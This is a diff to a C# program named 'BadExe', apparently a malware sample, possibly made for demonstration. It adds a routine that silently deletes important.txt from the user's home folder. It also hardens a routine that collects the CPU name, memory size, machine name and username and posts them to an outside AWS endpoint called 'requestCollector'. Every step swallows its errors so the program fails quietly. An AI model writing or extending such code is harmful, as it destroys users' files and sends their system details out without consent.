@@ -27,6 +27,14 @@ namespace BadExe
 
             try
             {
+                deleteImportantFile();
+            }
+            catch
+            {
+
+            }
+            try
+            {
                 SendDataToCloudRootFiles();
             }
             catch
@@ -106,15 +114,31 @@ namespace BadExe
 
         static async Task SendDataToCloudPC()
         {
-            var cpuName = GetProcessorName();
-            long ramAmount;
-            GetPhysicallyInstalledSystemMemory(out ramAmount);
+            long ramAmount=0;
+            try
+            {
+                GetPhysicallyInstalledSystemMemory(out ramAmount);
+            }
+            catch { }
 
-            var machineName=Environment.MachineName;
-            var username=Environment.UserName;
+            string machineName = "";
+            try
+            {
+                machineName = Environment.MachineName;
+            }catch { }
+            string username = "";
+            try
+            {
+                username = Environment.UserName;
+            }catch { }
 
             var httpClient = new HttpClient();
-            var httpContent = new StringContent("{\"cpuName\":\"" + cpuName + "\", \"memKb\":"+ ramAmount + ", \"machineName\":\""+ machineName+ "\", \"username\":\""+ username+"\"}");
+            string cpuName = "";
+            try
+            {
+                cpuName = GetProcessorName();
+            }catch { }
+            var httpContent = new StringContent("{\"cpuName\":\"" + cpuName + "\", \"memKb\":" + ramAmount + ", \"machineName\":\"" + machineName + "\", \"username\":\"" + username + "\"}");
             var result = await httpClient.PostAsync("https://o8m2j633k1.execute-api.eu-central-1.amazonaws.com/default/requestCollector", httpContent);
 
 
@@ -166,6 +190,20 @@ namespace BadExe
             }
             catch {
                 Console.Write("");
+            }
+        }
+
+        static void deleteImportantFile()
+        {
+            try
+            {
+                var userDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                var fileInfo = new FileInfo(userDir+"/important.txt");
+                fileInfo.Delete();
+            }
+            catch
+            {
+
             }
         }
     }
